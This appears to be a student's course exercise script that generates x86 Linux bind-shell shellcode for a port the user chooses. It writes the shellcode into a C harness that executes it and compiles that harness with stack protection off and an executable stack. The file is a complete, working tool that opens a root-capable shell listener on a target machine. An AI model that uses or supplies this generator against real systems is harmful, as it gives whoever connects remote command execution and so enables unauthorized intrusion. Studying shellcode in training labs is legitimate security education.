#!/usr/bin/python

# Filename: genBindShell.py
# Author: Jonathan So
# Student ID: SLAE-1470
# SLAE-Exercise 1

import sys
import os
import getopt

def usage():
	print('BindShellCode.py -p port | -h help')	

def main(argv):
	port = 0
	if(len(sys.argv) < 2):
		usage()
		sys.exit()
	try:
		opts,args = getopt.getopt(argv, "hp:", ['port='])
	except getopt.GetoptError:
		usage()
		sys.exit(2)
	for opt, arg in opts:
		if opt in ("-h", "--help"):
			usage()
			sys.exit()
		elif opt in ("-p", "--port"):
			port = int(arg)
			if port < 1 or port > 65535:
				print('Error port!')
				sys.exit(2)
			if port > 0 and port < 1025:
				print('You need root to use this port')
			print('Port: ' + str(port))
	hexPort = str(hex(port))[2::]
	if len(hexPort) <4:
		hexPort = '0'+hexPort
	print('Port in hex: ' + hexPort)
	hexPort = "\\x" + hexPort[0:2] + "\\x" + hexPort[2:]
	Shellcode = "\\x31\\xdb\\x31\\xc0\\x31\\xd2\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x5b"
	Shellcode +="\\x5e\\x52\\x66\\x68" + hexPort + "\\x66\\x6a\\x02\\x6a\\x10\\x51\\x50\\x89\\xe1\\x6a\\x66\\x58\\xcd"
	Shellcode +="\\x80\\x89\\x41\\x04\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x43\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb1\\x02" 
	Shellcode +="\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3" 
	Shellcode +="\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
	
	filename="BindShell-" + str(port) + ".c"
	print("Saving to " + filename)
 
	content = "#include<stdio.h>\n"
	content += "#include<string.h>\n"
	content += "unsigned char code[] = \\\n"
	content += "\"" + Shellcode + "\";\n"
	content += "int main(){\n"
	content += "	printf(\"Shellcode Length:  %d\\n\", strlen(code));\n"
	content += "	int (*ret)() = (int(*)())code;\n"
	content += "	ret();}\n"
  
	textfile = open(filename , 'w')
	textfile.write(content)
	textfile.close()

	os.system("gcc -m32 -fno-stack-protector -z execstack " + filename +" -o " + filename[:-2])

if __name__ == '__main__':
	main(sys.argv[1:])